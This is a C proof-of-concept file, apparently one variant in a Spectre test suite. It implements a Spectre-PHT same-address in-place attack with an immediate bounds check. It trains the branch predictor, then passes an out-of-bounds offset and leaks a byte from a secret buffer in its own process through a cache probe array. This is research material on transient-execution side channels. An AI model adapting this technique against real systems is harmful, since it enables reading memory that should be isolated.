#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"

// PHT In-Place with immediate bounds (no cache miss on bounds check)

#define BENIGN_SIZE PAGE_SIZE
#define IMMEDIATE_BOUND PAGE_SIZE

uint8_t* probe_array;

struct evset_pages {
    uint8_t page_barrier1[PAGE_SIZE];
    uint8_t victim[PAGE_SIZE];
    uint8_t page_barrier2[PAGE_SIZE];
    uint8_t secret_data[PAGE_SIZE];
    uint8_t page_barrier3[PAGE_SIZE];
} __attribute__((aligned(PAGE_SIZE))) evset_pages;

uint8_t *const page_barrier1 = evset_pages.page_barrier1;
uint8_t *const victim        = evset_pages.victim;
uint8_t *const page_barrier2 = evset_pages.page_barrier2;
uint8_t *const secret_data   = evset_pages.secret_data;
uint8_t *const page_barrier3 = evset_pages.page_barrier3;

volatile int index_cond;

// Bounds check uses immediate constant (no memory load)
void __attribute__((noinline)) victim_function(int idx) {
    if (index_cond < IMMEDIATE_BOUND) {
        SPEC_FENCE();
        maccess(probe_array + victim[idx] * PAGE_SIZE);
    }
}

typedef struct {
    int secret_offset;
    int training_x;
} pht_sa_ip_imm_data_t;

void pht_sa_ip_imm_setup(exploit_ctx_t* ctx, void* data) {
    pht_sa_ip_imm_data_t* pht_data = (pht_sa_ip_imm_data_t*)data;

    memset(victim, 0x01, PAGE_SIZE);
    memset(page_barrier1, 0x01, PAGE_SIZE);
    memset(page_barrier2, 0x01, PAGE_SIZE);
    memset(page_barrier3, 0x01, PAGE_SIZE);
    memset(secret_data, 0xFF, PAGE_SIZE);

    ctx->exclude_enabled = true;
    ctx->exclude_value = 0x01;

    pht_data->secret_offset = secret_data - victim;
    pht_data->training_x = 0;
}

void pht_sa_ip_imm_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    pht_sa_ip_imm_data_t* pht_data = (pht_sa_ip_imm_data_t*)data;

    secret_data[0] = encode_index;

    for (int j = 0; j < 60; j++) {
        // Arithmetic masking: j%20<19 -> training_x, j%20==19 -> malicious_x
        int mask = ~((j % 20) - 19) & ~0xFFFF;
        mask = (mask | (mask >> 16));
        int x = pht_data->training_x ^ (mask & (pht_data->secret_offset ^ pht_data->training_x));

        index_cond = x;
        flush((void*)&index_cond);
        mfence();

        victim_function(x);
    }
}

int main() {
    exploit_ctx_t ctx = {0};
    pht_sa_ip_imm_data_t pht_data = {0};

    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

    printf("Spectre-PHT sa-ip (immediate bounds)\n");

    exploit_hooks_t hooks = {
        .setup = pht_sa_ip_imm_setup,
        .attack = pht_sa_ip_imm_attack,
        .cleanup = NULL
    };

    exploit_run(&ctx, &hooks, &pht_data);
    exploit_print_results("PHT sa-ip-imm", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
